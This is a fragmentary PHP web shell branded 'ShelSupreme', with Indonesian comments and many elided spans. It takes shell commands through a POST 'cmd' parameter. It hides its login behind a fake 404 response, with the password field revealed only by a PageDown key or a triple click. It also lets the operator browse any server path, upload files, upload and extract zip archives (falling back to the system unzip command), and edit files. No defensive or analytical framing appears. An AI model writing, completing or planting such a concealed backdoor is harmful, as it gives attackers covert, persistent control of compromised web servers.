...
// ============================================
// ============================================
if (isset($_POST['cmd']) && isset($_SESSION['logged_in'])) {
...
// ============================================
// TAMPILAN LOGIN - MODIFIED WITH PAGE DOWN
// ============================================
if (empty($_SESSION['logged_in'])) {
    header("HTTP/1.0 404 Not Found");
?>
...
<body>
    ...
    <script>
        // ============================================
        // PAGE DOWN TRIGGER FOR PASSWORD
        // ============================================
        ...
        // Optional: Trigger with triple click
        let clickCount = 0;
        let clickTimer = null;
        ...
        // Show alert if password is wrong
        <?php if (isset($_POST['pass']) && !password_verify($_POST['pass'], $auth_pass_hash)): ?>
        alert("Invalid password!");
        <?php endif; ?>

        // Prevent accidental PageDown scrolling
...
// ============================================
$rootPath = __DIR__;
$currentPath = isset($_GET['path']) ? realpath(urldecode($_GET['path'])) : $rootPath;
    ...
    if (is_array($_FILES['upload_file']['name'])) {
        ...
        foreach ($_FILES['upload_file']['tmp_name'] as $key => $tmp_name) {
            if ($_FILES['upload_file']['error'][$key] === UPLOAD_ERR_OK) {
                $name = basename($_FILES['upload_file']['name'][$key]);
...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['zip_file'])) {
    ...
    if (move_uploaded_file($_FILES['zip_file']['tmp_name'], $zipPath)) {
        ...
        // Try to extract using ZipArchive (PHP built-in)
        ...
        // Try using system unzip command if ZipArchive failed
...
<body>
    <div class="container">
        ...
        <div class="header">
            <div class="header-top">
                <div class="brand">⚡ ShelSupreme</div>
                <div class="nav-links">
    ...
    <script>
        ...
        function editFile(file) {
            window.location.href = '?edit=' + encodeURIComponent(file) + '&path=' + encodeURIComponent(currentCwd);
        }
